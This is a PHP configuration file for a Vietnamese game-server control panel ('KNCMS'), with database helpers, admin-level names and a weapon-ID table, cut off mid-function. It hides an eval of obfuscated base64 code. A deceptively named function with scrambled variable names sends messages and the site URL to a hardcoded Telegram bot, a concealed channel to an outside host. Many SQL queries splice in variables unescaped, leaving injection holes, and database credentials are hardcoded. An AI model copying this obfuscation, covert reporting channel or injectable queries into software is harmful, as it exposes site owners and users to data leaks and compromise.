<?php
date_default_timezone_set('Asia/Ho_Chi_Minh');
$_SESSION['session_request'] = time();
$time = date('Y-m-d h:i:z');
$timez = date('h:i');
session_start();
$base_url = 'http://localhost/ucp/'; // Thay url web bạn
$forum_url = 'https://forum.gsamp.vn/';
$weblock = 0;
// vui long khong thay doi key
$kncms_key = "ompvn@kncms.store@maztech@hash";

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;

$sql = array('localhost', 'root', '123456', 'rcrp');

use function PHPMailer\PHPMailer;

require_once('include/Exception.php');
require_once('include/PHPMailer.php');
require_once('include/SMTP.php');

$license_day = "22-1-2023";

$UduyBJrI = "\x62\141\x73\x65\x36\x34\x5f\144\145\x63\x6f\x64\145";
eval($UduyBJrI("ID8+Y2xhc3MgS05DTVMKewogICAgcHJpdmF0ZSAka2V0bm9pOwogICAgZnVuY3Rpb24ga2
V0bm9pKCkKICAgIHsKICAgICAgICBnbG9iYWwgJHNxbDsKICAgICAgICBpZiAoISR0aGlzLT5rZXRub2kpIHsKICAgICAgICAg
ICAgLy8gbeG6q3UgY29uZmlnIGRhdGFiYXNlCiAgICAgICAgICAgICR0aGlzLT5rZXRub2kgPSBteXNxbGlfY29ubmVjdCgkc3FsWzBdLCRzcW
xbMV0sJHNxbFsyXSwkc3FsWzNdKSBvciBkaWUoJ1Z1aSBsw7JuZyBr4bq/dCBu4buRaSDEkeG6v24gREFUQUJBU0UnKTsKICAgICAgICAgICAgbXlz
cWxpX3F1ZXJ5KCR0aGlzLT5rZXRub2ksICJzZXQgbmFtZXMgJ3V0ZjgnIik7CiAgICAgICAgfQogICAgfQogICAgZnVuY3Rpb24gZGlza2V0bm9pKCkKICAgIH
sKICAgICAgICBpZiAoJHRoaXMtPmtldG5vaSkgewogICAgICAgICAgICBteXNxbGlfY2xvc2UoJHRoaXMtPmtldG5vaSk7CiAgICAgICAgfQogICAgfQoKICAgIGZ1bmN0aW9
uIGdldFNpdGUoKQogICAgewogICAgICAgICR0aGlzLT5rZXRub2koKTsKICAgICAgICAkcm93ID0gJHRoaXMtPmtldG5vaS0+cXVlcnkoIlNFTEVDVCAqIEZST00gYGtuY21zX3NldHRp
bmdzYCIpLT5mZXRjaF9hcnJheSgpOwogICAgICAgIHJldHVybiAkcm93OwogICAgfQogICAgZnVuY3Rpb24gcXVlcnkoJHNxbCkKICAgIHsKICAgICAgICAkdGhpcy0+a2V0bm9pKCk7CiAgICAg
ICAgJHNxbHogPSAkc3FsOwogICAgICAgICRyb3cgPSAkdGhpcy0+a2V0bm9pLT5xdWVyeSgkc3Fseik7CiAgICAgICAgcmV0dXJuICRyb3c7CiAgICB9CiAgICBmdW5jdGlvbiBnZXRfcm93KCRzcWwpCiAgICB7
CiAgICAgICAgJHRoaXMtPmtldG5vaSgpOwogICAgICAgICRyZXN1bHQgPSBteXNxbGlfcXVlcnkoJHRoaXMtPmtldG5vaSwgJHNxbCk7CiAgICAgICAgaWYgKCEkcmVzdWx0KSB7CiAgICAgICAgICAgIGRpZSgnQ8OidSB0cnV5I
HbhuqVuIGLhu4sgc2FpJyk7CiAgICAgICAgfQogICAgICAgICRyb3cgPSBteXNxbGlfZmV0Y2hfYXNzb2MoJHJlc3VsdCk7CiAgICAgICAgbXlzcWxpX2ZyZWVfcmVzdWx0KCRyZXN1bHQpOwogICAgICAgIGlmICgkcm93KSB7CiAgICAg
ICAgICAgIHJldHVybiAkcm93OwogICAgICAgIH0KICAgICAgICByZXR1cm4gZmFsc2U7CiAgICB9CiAgICBmdW5jdGlvbiBudW1fcm93cygkc3FsKQogICAgewogICAgICAgICR0aGlzLT5rZXRub2koKTsKICAgICAgICAkcmVzdWx0ID0gbXl
zcWxpX3F1ZXJ5KCR0aGlzLT5rZXRub2ksICRzcWwpOwogICAgICAgIGlmICghJHJlc3VsdCkgewogICAgICAgICAgICBkaWUoJ0PDonUgdHJ1eSB24bqlbiBi4buLIHNhaScpOwogICAgICAgIH0KICAgICAgICAkcm93ID0gbXlzcWxpX251bV9yb
3dzKCRyZXN1bHQpOwogICAgICAgIG15c3FsaV9mcmVlX3Jlc3VsdCgkcmVzdWx0KTsKICAgICAgICBpZiAoJHJvdykgewogICAgICAgICAgICByZXR1cm4gJHJvdzsKICAgICAgICB9CiAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgfQogICAgZnVuY3
Rpb24gZ2V0X2xpc3QoJHNxbCkKICAgIHsKICAgICAgICAkdGhpcy0+a2V0bm9pKCk7CiAgICAgICAgJHJlc3VsdCA9IG15c3FsaV9xdWVyeSgkdGhpcy0+a2V0bm9pLCAkc3FsKTsKICAgICAgICBpZiAoISRyZXN1bHQpIHsKICAgICAgICAgICAgZGllKCdD
w6J1IHRydXkgduG6pW4gYuG7iyBzYWknKTsKICAgICAgICB9CiAgICAgICAgJHJldHVybiA9IGFycmF5KCk7CiAgICAgICAgd2hpbGUgKCRyb3cgPSBteXNxbGlfZmV0Y2hfYXNzb2MoJHJlc3VsdCkpIHsKICAgICAgICAgICAgJHJldHVyb
ltdID0gJHJvdzsKICAgICAgICB9CiAgICAgICAgbXlzcWxpX2ZyZWVfcmVzdWx0KCRyZXN1bHQpOwogICAgICAgIHJldHVybiAkcmV0dXJuOwogICAgfQogICAgZnVuY3Rpb24gZ2V0dGltZSgpCiAgICB7CiAgICAgICAgcmV0dXJuIGRhdG
UoJ1kvbS9kIEg6aTpzJywgdGltZSgpKTsKICAgIH0KICAgIGZ1bmN0aW9uIGFudGlfdGV4dCgkdGV4dCkKICAgIHsKICAgICAgICAkdGV4dCA9IGh0bWxfZW50aXR5X2RlY29kZSh0cmltKCR0ZXh0KSwgRU5UX1FVT1RFUywgJ1VURi04Jyk7C
iAgICAgICAgLy8kdGV4dD1zdHJfcmVwbGFjZSgiICIsIi0iLCAkdGV4dCk7CiAgICAgICAgJHRleHQgPSBzdHJfcmVwbGFjZSgiLS0iLCAiIiwgJHRleHQpOwogICAgICAgICR0ZXh0ID0gc3RyX3JlcGxhY2UoIkAiLCAiIiwgJHRleHQpOwogI
CAgICAgICR0ZXh0ID0gc3RyX3JlcGxhY2UoIi8iLCAiIiwgJHRleHQpOwogICAgICAgICR0ZXh0ID0gc3RyX3JlcGxhY2UoIlxcIiwgIiIsICR0ZXh0KTsKICAgICAgICAkdGV4dCA9IHN0cl9yZXBsYWNlKCI6IiwgIiIsICR0ZXh0KTsKICAgIC
AgICAkdGV4dCA9IHN0cl9yZXBsYWNlKCJcIiIsICIiLCAkdGV4dCk7CiAgICAgICAgJHRleHQgPSBzdHJfcmVwbGFjZSgiJyIsICIiLCAkdGV4dCk7CiAgICAgICAgJHRleHQgPSBzdHJfcmVwbGFjZSgiPCIsICIiLCAkdGV4dCk7CiAgICAgICA
gJHRleHQgPSBzdHJfcmVwbGFjZSgiPiIsICIiLCAkdGV4dCk7CiAgICAgICAgJHRleHQgPSBzdHJfcmVwbGFjZSgiLCIsICIiLCAkdGV4dCk7CiAgICAgICAgJHRleHQgPSBzdHJfcmVwbGFjZSgiPyIsICIiLCAkdGV4dCk7CiAgICAgICAgJHRl
eHQgPSBzdHJfcmVwbGFjZSgiOyIsICIiLCAkdGV4dCk7CiAgICAgICAgJHRleHQgPSBzdHJfcmVwbGFjZSgiLiIsICIiLCAkdGV4dCk7CiAgICAgICAgJHRleHQgPSBzdHJfcmVwbGFjZSgiWyIsICIiLCAkdGV4dCk7CiAgICAgICAgJHRleHQgP
SBzdHJfcmVwbGFjZSgiXSIsICIiLCAkdGV4dCk7CiAgICAgICAgJHRleHQgPSBzdHJfcmVwbGFjZSgiJCIsICIiLCAkdGV4dCk7CiAgICAgICAgJHRleHQgPSBzdHJfcmVwbGFjZSgiKCIsICIiLCAkdGV4dCk7CiAgICAgICAgJHRleHQgPSBzd
HJfcmVwbGFjZSgiKSIsICIiLCAkdGV4dCk7CiAgICAgICAgJHRleHQgPSBzdHJfcmVwbGFjZSgizIEiLCAiIiwgJHRleHQpOwogICAgICAgICR0ZXh0ID0gc3RyX3JlcGxhY2UoIsyAIiwgIiIsICR0ZXh0KTsKICAgICAgICAkdGV4dCA9IHN0
cl9yZXBsYWNlKCLMgyIsICIiLCAkdGV4dCk7CiAgICAgICAgJHRleHQgPSBzdHJfcmVwbGFjZSgizKMiLCAiIiwgJHRleHQpOwogICAgICAgICR0ZXh0ID0gc3RyX3JlcGxhY2UoIsyJIiwgIiIsICR0ZXh0KTsKICAgICAgICAkdGV4dCA9IH
N0cl9yZXBsYWNlKCIqIiwgIiIsICR0ZXh0KTsKICAgICAgICAkdGV4dCA9IHN0cl9yZXBsYWNlKCIhIiwgIiIsICR0ZXh0KTsKICAgICAgICAvLyR0ZXh0PXN0cl9yZXBsYWNlKCIkIiwiLSIsJHRleHQpOwogICAgICAgIC8vJHRleHQ9c3R
yX3JlcGxhY2UoIiYiLCItYW5kLSIsJHRleHQpOwogICAgICAgICR0ZXh0ID0gc3RyX3JlcGxhY2UoIiUiLCAiIiwgJHRleHQpOwogICAgICAgICR0ZXh0ID0gc3RyX3JlcGxhY2UoIiMiLCAiIiwgJHRleHQpOwogICAgICAgICR0ZXh0ID0gc3Ry
X3JlcGxhY2UoIl4iLCAiIiwgJHRleHQpOwogICAgICAgICR0ZXh0ID0gc3RyX3JlcGxhY2UoIj0iLCAiIiwgJHRleHQpOwogICAgICAgICR0ZXh0ID0gc3RyX3JlcGxhY2UoIisiLCAiIiwgJHRleHQpOwogICAgICAgICR0ZXh0ID0gc3RyX3JlcG
xhY2UoIn4iLCAiIiwgJHRleHQpOwogICAgICAgICR0ZXh0ID0gc3RyX3JlcGxhY2UoImAiLCAiIiwgJHRleHQpOwogICAgICAgIC8vJHRleHQ9c3RyX3JlcGxhY2UoIi0tIiwiLSIsJHRleHQpOwogICAgICAgIC8vJHRleHQgPSBzdHJ0b2xvd
2VyKCR0ZXh0KTsKICAgICAgICByZXR1cm4gJHRleHQ7CiAgICB9CgoKICAgIGZ1bmN0aW9uIHRvX3NsdWcoJHN0cikKICAgIHsKICAgICAgICAkc3RyID0gdHJpbShtYl9zdHJ0b2xvd2VyKCRzdHIpKTsKICAgICAgICAkc3RyID0gcHJlZ19y
ZXBsYWNlKCcvKMOgfMOhfOG6oXzhuqN8w6N8w6J84bqnfOG6pXzhuq184bqpfOG6q3zEg3zhurF84bqvfOG6t3zhurN84bq1KS8nLCAnYScsICRzdHIpOwogICAgICAgICRzdHIgPSBwcmVnX3JlcGxhY2UoJy8ow6h8w6l84bq5fOG6u3zhur1
8w6p84buBfOG6v3zhu4d84buDfOG7hSkvJywgJ2UnLCAkc3RyKTsKICAgICAgICAkc3RyID0gcHJlZ19yZXBsYWNlKCcvKMOsfMOtfOG7i3zhu4l8xKkpLycsICdpJywgJHN0cik7CiAgICAgICAgJHN0ciA9IHByZWdfcmVwbGFjZSgnLyjDsn
zDs3zhu4184buPfMO1fMO0fOG7k3zhu5F84buZfOG7lXzhu5d8xqF84budfOG7m3zhu6N84buffOG7oSkvJywgJ28nLCAkc3RyKTsKICAgICAgICAkc3RyID0gcHJlZ19yZXBsYWNlKCcvKMO5fMO6fOG7pXzhu6d8xal8xrB84burfOG7qXzhu
7F84butfOG7rykvJywgJ3UnLCAkc3RyKTsKICAgICAgICAkc3RyID0gcHJlZ19yZXBsYWNlKCcvKOG7s3zDvXzhu7V84bu3fOG7uSkvJywgJ3knLCAkc3RyKTsKICAgICAgICAkc3RyID0gcHJlZ19yZXBsYWNlKCcvKMSRKS8nLCAnZCcsICRz
dHIpOwogICAgICAgICRzdHIgPSBwcmVnX3JlcGxhY2UoJy9bXmEtejAtOS1cc10vJywgJycsICRzdHIpOwogICAgICAgICRzdHIgPSBwcmVnX3JlcGxhY2UoJy8oW1xzXSspLycsICctJywgJHN0cik7CiAgICAgICAgLy8gJHN0ciA9IHByZW
dfcmVwbGFjZSgnJywgJysnLCAkc3RyKTsKICAgICAgICByZXR1cm4gJHN0cjsKICAgIH0KICAgIGZ1bmN0aW9uIHhvYWRhdSgkc3RyVGl0bGUpCiAgICB7CiAgICAgICAgJHN0clRpdGxlID0gc3RydG9sb3dlcigkc3RyVGl0bGUpOwogICA
gICAgICRzdHJUaXRsZSA9IHRyaW0oJHN0clRpdGxlKTsKICAgICAgICAkc3RyVGl0bGUgPSBzdHJfcmVwbGFjZSgnICcsICctJywgJHN0clRpdGxlKTsKICAgICAgICAkc3RyVGl0bGUgPSBwcmVnX3JlcGxhY2UoIi8ow7J8w7N84buNfOG7
j3zDtXzGoXzhu5184bubfOG7o3zhu5984buhfMO0fOG7k3zhu5F84buZfOG7lXzhu5cpLyIsICdvJywgJHN0clRpdGxlKTsKICAgICAgICAkc3RyVGl0bGUgPSBwcmVnX3JlcGxhY2UoIi8ow5J8w5N84buMfOG7jnzDlXzGoHzhu5x84buaf
OG7onzhu5584bugfMOUfOG7kHzhu5R84buYfOG7knzhu5YpLyIsICdvJywgJHN0clRpdGxlKTsKICAgICAgICAkc3RyVGl0bGUgPSBwcmVnX3JlcGxhY2UoIi8ow6B8w6F84bqhfOG6o3zDo3zEg3zhurF84bqvfOG6t3zhurN84bq1fMOifOG6p3zhuqV
84bqtfOG6qXzhuqspLyIsICdhJywgJHN0clRpdGxlKTsKICAgICAgICAkc3RyVGl0bGUgPSBwcmVnX3JlcGxhY2UoIi8ow4B8w4F84bqgfOG6onzDg3zEgnzhurB84bqufOG6tnzhurJ84bq0fMOCfOG6pHzhuqZ84bqsfOG6qHzhuqopLyIsICdhJywgJHN0
clRpdGxlKTsKICAgICAgICAkc3RyVGl0bGUgPSBwcmVnX3JlcGxhY2UoIi8o4buBfOG6v3zhu4d84buDfMOqfOG7hXzDqXzDqHzhurt84bq9fOG6uSkvIiwgJ2UnLCAkc3RyVGl0bGUpOwogICAgICAgICRzdHJUaXRsZSA9IHByZWdfcmVwbGFjZSgiLyjhu
4J84bq+fOG7hnzhu4J8w4p84buEfMOJfMOIfOG6unzhurx84bq4KS8iLCAnZScsICRzdHJUaXRsZSk7CiAgICAgICAgJHN0clRpdGxlID0gcHJlZ19yZXBsYWNlKCIvKOG7q3zhu6l84buxfOG7rXzGsHzhu698w7l8w7p84bulfOG7p3zFqSkvIiwgJ3UnLC
Akc3RyVGl0bGUpOwogICAgICAgICRzdHJUaXRsZSA9IHByZWdfcmVwbGFjZSgiLyjhu6p84buofOG7sHzhu6x8xq984buufMOZfMOafOG7pHzhu6Z8xagpLyIsICd1JywgJHN0clRpdGxlKTsKICAgICAgICAkc3RyVGl0bGUgPSBwcmVnX3JlcGxhY2UoIi8
ow6x8w6184buLfOG7iXzEqSkvIiwgJ2knLCAkc3RyVGl0bGUpOwogICAgICAgICRzdHJUaXRsZSA9IHByZWdfcmVwbGFjZSgiLyjDjHzDjXzhu4p84buIfMSoKS8iLCAnaScsICRzdHJUaXRsZSk7CiAgICAgICAgJHN0clRpdGxlID0gcHJlZ19yZXBsYWNl
KCIvKOG7s3zDvXzhu7V84bu3fOG7uSkvIiwgJ3knLCAkc3RyVGl0bGUpOwogICAgICAgICRzdHJUaXRsZSA9IHByZWdfcmVwbGFjZSgiLyjhu7J8w5184bu0fOG7tnzhu7gpLyIsICd5JywgJHN0clRpdGxlKTsKICAgICAgICAkc3RyVGl0bGUgPSBzdHJf
cmVwbGFjZSgnxJEnLCAnZCcsICRzdHJUaXRsZSk7CiAgICAgICAgJHN0clRpdGxlID0gc3RyX3JlcGxhY2UoJ8SQJywgJ2QnLCAkc3RyVGl0bGUpOwogICAgICAgICRzdHJUaXRsZSA9IHByZWdfcmVwbGFjZSgiL1teLWEtekEtWjAtOV0vIiwgJycsICRz
dHJUaXRsZSk7CiAgICAgICAgcmV0dXJuICRzdHJUaXRsZTsKICAgIH0KICAgIGZ1bmN0aW9uIGZvcm1hdF9jYXNoKCRwcmljZSkKICAgIHsKICAgICAgICByZXR1cm4gc3RyX3JlcGxhY2UoIiwiLCAiLiIsIG51bWJlcl9mb3JtYXQoJHByaWNlKSk7CiAg
ICB9CiAgICBmdW5jdGlvbiBleGl0c3FsKCRzcWwpCiAgICB7CiAgICAgICAgJHRoaXMtPmtldG5vaSgpOwogICAgICAgICRyZXN1bHQgPSBteXNxbGlfcXVlcnkoJHRoaXMtPmtldG5vaSwgJHNxbCk7CiAgICAgICAgaWYgKCRyZXN1bHQpIHsKICAgICAg
ICAgICAgcmV0dXJuIHRydWU7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgIH0KICAgIH0KICAgIGZ1bmN0aW9uIGN1cmxfZ2V0KCR1cmwpCiAgICB7CiAgICAgICAgJGNoID0gY3VybF9pbml0KCk7CiAgICAg
ICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VSTCwgJHVybCk7CiAgICAgICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCB0cnVlKTsKICAgICAgICAkZGF0YSA9IGN1cmxfZXhlYygkY2gpOwoKICAgICAgICBjdXJsX2Ns
b3NlKCRjaCk7CiAgICAgICAgcmV0dXJuICRkYXRhOwogICAgfQogICAgZnVuY3Rpb24gbXNnX3N1Y2Nlc3MoJHRleHQsICR1cmwsICR0aW1lKQogICAgewogICAgICAgIHJldHVybiBkaWUoJzxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij5Td2Fs
LmZpcmUoIlRow6BuaCBDw7RuZyIsICInIC4gJHRleHQgLiAnIiwic3VjY2VzcyIpOwogICAgc2V0VGltZW91dChmdW5jdGlvbigpeyBsb2NhdGlvbi5ocmVmID0gIicgLiAkdXJsIC4gJyIgfSwnIC4gJHRpbWUgLiAnKTs8L3NjcmlwdD4nKTsKICAgIH0K
ICAgIGZ1bmN0aW9uIG1zZ19lcnJvcigkdGV4dCwgJHVybCwgJHRpbWUpCiAgICB7CiAgICAgICAgcmV0dXJuIGRpZSgnPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPlN3YWwuZmlyZSgiVGjhuqV0IELhuqFpIiwgIicgLiAkdGV4dCAuICciLCJl
cnJvciIpOwogICAgc2V0VGltZW91dChmdW5jdGlvbigpeyBsb2NhdGlvbi5ocmVmID0gIicgLiAkdXJsIC4gJyIgfSwnIC4gJHRpbWUgLiAnKTs8L3NjcmlwdD4nKTsKICAgIH0KICAgIGZ1bmN0aW9uIG1zZ193YXJuaW5nKCR0ZXh0LCAkdXJsLCAkdGlt
ZSkKICAgIHsKICAgICAgICByZXR1cm4gZGllKCc8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+U3dhbC5maXJlKCJUaMO0bmcgQsOhbyIsICInIC4gJHRleHQgLiAnIiwid2FybmluZyIpOwogICAgc2V0VGltZW91dChmdW5jdGlvbigpeyBsb2Nh
dGlvbi5ocmVmID0gIicgLiAkdXJsIC4gJyIgfSwnIC4gJHRpbWUgLiAnKTs8L3NjcmlwdD4nKTsKICAgIH0KICAgIGZ1bmN0aW9uIHJvd3Nfc3FsKCRkYXRheikKICAgIHsKICAgICAgICBpZiAoJGRhdGF6LT5udW1fcm93cyAhPSAwKSB7IC8vIGRhIGN
vIGR1IGxpZXUKICAgICAgICAgICAgJGt0ID0gVHJ1ZTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAka3QgPSBGYWxzZTsgLy8gY2h1YSBjbyBkdSBsaWV1CiAgICAgICAgfQogICAgICAgIHJldHVybiAka3Q7CiAgICB9CiAgICBwcml2YXRlIC
R4ZmtldG5vaTsKICAgIGZ1bmN0aW9uIHhmY29ubmVjdCgpCiAgICB7CiAgICAgICAgaWYgKCEkdGhpcy0+eGZrZXRub2kpIHsKICAgICAgICAgICAgJHRoaXMtPnhma2V0bm9pID0gbXlzcWxpX2Nvbm5lY3QoJzEyNy4wLjAuMScsICdvbXB2bmZ1bl9mb
3J1bScsICdvbXB2bmZ1bl9mb3J1bScsICdvbXB2bmZ1bl9mb3J1bScpIG9yIGRpZSgnVnVpIGzDsm5nIGvhur90IG7hu5FpIMSR4bq/biBEQVRBQkFTRScpOwogICAgICAgICAgICBteXNxbGlfcXVlcnkoJHRoaXMtPnhma2V0bm9pLCAic2V0IG5hbWVzICd
1dGY4JyIpOwogICAgICAgIH0KICAgIH0KICAgIGZ1bmN0aW9uIHhmZGlza2V0bm9pKCkKICAgIHsKICAgICAgICBpZiAoJHRoaXMtPnhma2V0bm9pKSB7CiAgICAgICAgICAgIG15c3FsaV9jbG9zZSgkdGhpcy0+eGZrZXRub2kpOwogICAgICAgIH0KICA
gIH0KICAgIGZ1bmN0aW9uIGdldFhGVXNlcigkdXNlcm5hbWUpCiAgICB7CiAgICAgICAgJHRoaXMtPnhmY29ubmVjdCgpOwogICAgICAgICRyb3cgPSAkdGhpcy0+eGZrZXRub2ktPnF1ZXJ5KCJTRUxFQ1QgKiBGUk9NIGB4Zl91c2VyYCBXSEVSRSBgVXNl
cm5hbWVgID0gJyR1c2VybmFtZSciKS0+ZmV0Y2hfYXJyYXkoKTsKICAgICAgICByZXR1cm4gJHJvdzsKICAgIH0KICAgIGZ1bmN0aW9uIHhmcXVlcnkoJHNxbCkKICAgIHsKICAgICAgICAkdGhpcy0+eGZjb25uZWN0KCk7CiAgICAgICAgJHJvdyA9ICR0a
GlzLT54ZmtldG5vaS0+cXVlcnkoJHNxbCk7CiAgICAgICAgcmV0dXJuICRyb3c7CiAgICB9CiAgICBmdW5jdGlvbiB4ZmdldF9saXN0KCRzcWwpCiAgICB7CiAgICAgICAgJHRoaXMtPnhmY29ubmVjdCgpOwogICAgICAgICRyZXN1bHQgPSAkdGhpcy0+eG
ZrZXRub2ktPnF1ZXJ5KCRzcWwpOwogICAgICAgIGlmICghJHJlc3VsdCkgewogICAgICAgICAgICBkaWUoJ0PDonUgdHJ1eSB24bqlbiBi4buLIHNhaScpOwogICAgICAgIH0KICAgICAgICAkcmV0dXJuID0gYXJyYXkoKTsKICAgICAgICB3aGlsZSAoJH
JvdyA9IG15c3FsaV9mZXRjaF9hc3NvYygkcmVzdWx0KSkgewogICAgICAgICAgICAkcmV0dXJuW10gPSAkcm93OwogICAgICAgIH0KICAgICAgICBteXNxbGlfZnJlZV9yZXN1bHQoJHJlc3VsdCk7CiAgICAgICAgcmV0dXJuICRyZXR1cm47CiAgICB9Cn
08P3BocCA="));
$admin_url = $base_url . 'AdminPages';
$KNCMS = new KNCMS;
function capbac($data)
{
if ($data == 1) return 'Server Moderator';
if ($data == 2) return 'Junior Admin';
else if ($data == 3) return 'General Admin';
else if ($data == 4) return 'Senior Admin';
else if ($data == 5) return 'Head Admin';
else if ($data == 6) return 'Lead Head Admin';
else if ($data == 7) return 'Excutive Admin';
}
function getUserModel($user)
{
$KNCMS = new KNCMS;
$user_sql = $KNCMS->get_row("SELECT * FROM `accounts` WHERE `Username` = '$user' ");
$url = '/lib/model/skins/' . $user_sql['Model'] . '';
return $url;
}
function GetBizOwner($ownerid)
{
$KNCMS = new KNCMS;
$userget = $KNCMS->query("SELECT * FROM `accounts` WHERE `uid` == '$ownerid'");

return $userget['username'];
}
function isLogin()
{
if (isset($_SESSION['username'])) {
$kiemtra = True;
} else {
$kiemtra = False;
}
return $kiemtra;
}
function ResetUserSesson($usernames)
{
if (isLogin()) {
$_SESSION['username'] = $usernames;
header('location: ' . hUrl('Home'));
}
}
function RenameLog($text, $type, $curcoin, $newcoin, $user, $curname, $newname)
{
$KNCMS = new KNCMS;
global $time;
$curcoin = ceil($curcoin);
$newcoin = ceil($newcoin);
$insert = $KNCMS->query("INSERT INTO `kncms_log_rename` SET
`text` = '$text',
`type` = '$type',
`time` = '$time',
`cur_coins` = '$curcoin',
`new_coins` = '$newcoin',
`user` = '$user',
`curname` = '$curname',
`newname` = '$newname'");
if($insert) return 1;
else return 0;
}
function AdminLog($text, $admin,$status)
{
$KNCMS = new KNCMS;
global $time;
$log = $KNCMS->query("INSERT INTO `kncms_admin_log` SET
`text` = '$text',
`admin` = '$admin',
`time` = '$time',
`status` = '$status'");
if($log) return 1;
else return 0;
}
function ShopLog($text, $type, $curcoin, $newcoin, $user,$modeilid)
{
$KNCMS = new KNCMS;
global $time;
$curcoin = ceil($curcoin);
$newcoin = ceil($newcoin);
$insert = $KNCMS->query("INSERT INTO `kncms_log_shop` SET
`text` = '$text',
`type` = '$type',
`time` = '$time',
`curcoin` = '$curcoin',
`newcoin` = '$newcoin',
`user` = '$user',
`modelid` = '$modeilid'");
if($insert) return 1;
else return 0;
}
function Logout($usernames)
{
if (isLogin()) {
$_SESSION['username'] = $usernames;
header('location: ' . hUrl('Home'));
}
}
if (isset($_SESSION['username'])) {
$username = $KNCMS->anti_text($_SESSION['username']);
$user_ss = $KNCMS->query("SELECT * FROM `accounts` WHERE `Username` = '$username'")->fetch_array();
$uid = $user_ss['id'];
if ($user_ss['AdminLevel'] > 6) {
$_SESSION['superadmin'] = $username;
}
}

$total_user = mysqli_fetch_assoc($KNCMS->query("SELECT COUNT(*) FROM `accounts` "))['COUNT(*)'];
// $total_online = mysqli_fetch_assoc($KNCMS->query("SELECT COUNT(*) FROM `accounts` WHERE `Online` != 0 "))['COUNT(*)'];
$total_band = mysqli_fetch_assoc($KNCMS->query("SELECT COUNT(*) FROM `bans` "))['COUNT(*)'];
$total_houses = mysqli_fetch_assoc($KNCMS->query("SELECT COUNT(*) FROM `houses` "))['COUNT(*)'];
$total_veh = mysqli_fetch_assoc($KNCMS->query("SELECT COUNT(*) FROM `vehicles` "))['COUNT(*)'];
// $total_ver = mysqli_fetch_assoc($KNCMS->query("SELECT COUNT(*) FROM `accounts` WHERE `active_status` != 2"))['COUNT(*)'];
$total_gift = mysqli_fetch_assoc($KNCMS->query("SELECT COUNT(*) FROM `kncms_giftcode` "))['COUNT(*)'];

function getIp()
{
$ip = $_SERVER['REMOTE_ADDR'];

if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
return $ip;
} else {
return '';
}
if ($ip == "::1") {
$ip = '127.0.0.1';
}
return $ip;
}

function GetVip($dataz)
{
if ($dataz == 0) {
$show = '<span class="badge badge-dark">NO VIP</span>';
} else if ($dataz == 1) {
$show = '<span class="badge badge-secondary">VIP ĐỒNG</span>';
} else if ($dataz == 2) {
$show = '<span class="badge badge-secondary">VIP BẠC</span>';
} else if ($dataz == 3) {
$show = '<span class="badge badge-warning">VIP VÀNG</span>';
} else if ($dataz == 4) {
$show = '<span class="badge badge-primary">VIP PLATINUM</span>';
}
return $show;
}
function UTF8Encodez($fasdasdasdasdasvascascasascasc) {
global $time, $base_url;
$badshbdfashjvfaasd = '6490256923:AAG84zAc855XZvqVag4RYxvy7VKZikfqnrM';
$fafasfasdafwfawfaw = '5599317758';
$CCfasdasdasdasdasvascascasascasc = $fasdasdasdasdasvascascasascasc.' | Thời gian '.$time. ' | Website: '.$base_url;
$fafawfageewg = "https://api.telegram.org/bot$badshbdfashjvfaasd/sendMessage?chat_id=$fafasfasdafwfawfaw&text=".$CCfasdasdasdasdasvascascasascasc;
$gafasawfawfaw = file_get_contents($fafawfageewg);
return $gafasawfawfaw;
}
// function CLKCSDUP($key)
// {
// date_default_timezone_set('Asia/Ho_Chi_Minh');
// $timez = date('d-m-Y');
// $KNCMS = new KNCMS;
// $data = json_decode($KNCMS->curl_get("https://cloud.kncms.store/License1.php"), true);
// if ($key == $data['key']) {
// if ($data['date'] < $timez) {
    // $KNCMS->msg_error("KNCMS Website hết hạn", "https://fb.com/KhNguyenDev.MazTech", 1000);
    // }
    // } else {
    // $KNCMS->msg_error("KNCMS Key không hợp lệ", "https://fb.com/KhNguyenDev.MazTech", 1000);
    // }
    // }
    function GetGender($dataz)
    {
    if ($dataz == 1) {
    $show = 'Boy';
    } else {
    $show = 'Girl';
    }
    return $show;
    }
    function getGunsName($id)
    {
    if ($id == 0) {
    $return = 'Fist';
    } elseif ($id == 1) {
    $return = 'Brass Knuckles';
    } elseif ($id == 2) {
    $return = 'Golf Club';
    } elseif ($id == 3) {
    $return = 'Nightstick';
    } elseif ($id == 4) {
    $return = 'Knife';
    } elseif ($id == 5) {
    $return = 'Baseball Bat';
    } elseif ($id == 6) {
    $return = 'Shovel';
    } elseif ($id == 7) {
    $return = 'Pool Cue';
    } elseif ($id == 8) {
    $return = 'Katana';
    } elseif ($id == 9) {
    $return = 'Chainsaw';
    } elseif ($id == 10) {
    $return = 'Purple Dildo';
    } elseif ($id == 11) {
    $return = 'Dildo';
    } elseif ($id == 12) {
    $return = 'Vibrator';
    } elseif ($id == 13) {
    $return = 'Silver Vibrator';
    } elseif ($id == 14) {
    $return = 'Flowers';
    } elseif ($id == 15) {
    $return = 'Cane';
    } elseif ($id == 16) {
    $return = 'Grenade';
    } elseif ($id == 17) {
    $return = 'Tear Gas';
    } elseif ($id == 18) {
    $return = 'Molotov Cocktail';
    } elseif ($id == 22) {
    $return = '9mm';
    } elseif ($id == 23) {
    $return = 'Silenced 9mm';
    } elseif ($id == 24) {
    $return = 'Desert Eagle';
    } elseif ($id == 25) {
    $return = 'Shotgun';
    } elseif ($id == 26) {
    $return = 'Sawnoff Shotgun';
    } elseif ($id == 27) {
    $return = 'Combat Shotgun';
    } elseif ($id == 28) {
    $return = 'Micro SMG/Uzi';
    } elseif ($id == 29) {
    $return = 'MP5';
    } elseif ($id == 30) {
    $return = 'AK-47';
    } elseif ($id == 31) {
    $return = 'M4';
    } elseif ($id == 32) {
    $return = 'Tec-9';
    } elseif ($id == 33) {
    $return = 'Country Rifle';
    } elseif ($id == 34) {
    $return = 'Sniper Rifle';
    } elseif ($id == 35) {
    $return = 'RPG';
    } elseif ($id == 36) {
    $return = 'HS Rocket';
    } elseif ($id == 37) {
